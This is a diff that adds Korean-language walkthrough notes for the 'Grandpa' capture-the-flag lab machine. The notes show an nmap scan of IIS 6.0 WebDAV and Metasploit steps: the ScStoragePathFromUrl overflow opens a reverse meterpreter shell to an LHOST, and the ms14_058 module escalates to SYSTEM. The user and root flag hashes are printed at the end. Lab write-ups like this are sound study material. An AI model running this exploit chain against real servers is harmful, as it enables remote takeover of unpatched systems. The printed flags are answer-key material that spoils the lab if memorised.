@@ -1,0 +1,86 @@
+Mahcine: Grandpa
+TARGET: 10.129.95.233
+
+
+nmap -sV -sC -oA nmap/Grandpa $ip 
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+|_http-title: Under Construction
+| http-methods: 
+|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
+| http-webdav-scan: 
+|   Server Type: Microsoft-IIS/6.0
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
+|   Server Date: Sun, 27 Jul 2025 12:26:38 GMT
+|_  WebDAV type: Unknown
+|_http-server-header: Microsoft-IIS/6.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Microsoft-IIS/6.0 사용중
+https://www.exploit-db.com/exploits/41992
+icrosoft IIS - WebDav 'ScStoragePathFromUrl' Remote Overflow (Metasploit) 취약점 존재
+
+msfconsole
+set RHOSTS 10.129.95.233
+set LHOST 10.10.14.156
+
+meterpreter 셸 획득
+
+getuid 가 실행안됨
+ps
+1896  584   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
+2400  584   wmiprvse.exe
+migrate 1896
+
+wmiprvse.exe으로 migrate시도
+meterpreter > getuid
+Server username: NT AUTHORITY\NETWORK SERVICE
+취약점 탐색하기 위해 metasploit 자동화 recon사용
+
+msf6 post(multi/recon/local_exploit_suggester) > run
+
+
+ #   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.                                                                                                                                              
+ 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
+ 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
+ 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.                                                                                                                                              
+ 6   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
+
+
+
+use exploit/windows/local/ms14_058_track_popup_menu  
+set SESSION 1
+set LHOST 10.10.14.156
+
+run
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+관리자 권한 셸 획득
+
+cat user.txt
+> bdff5ec67c3cff017f2bedc146a5d869
+
+cat root.txt
+> 9359e905a2c35f861f6a57cecf28bb7b
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
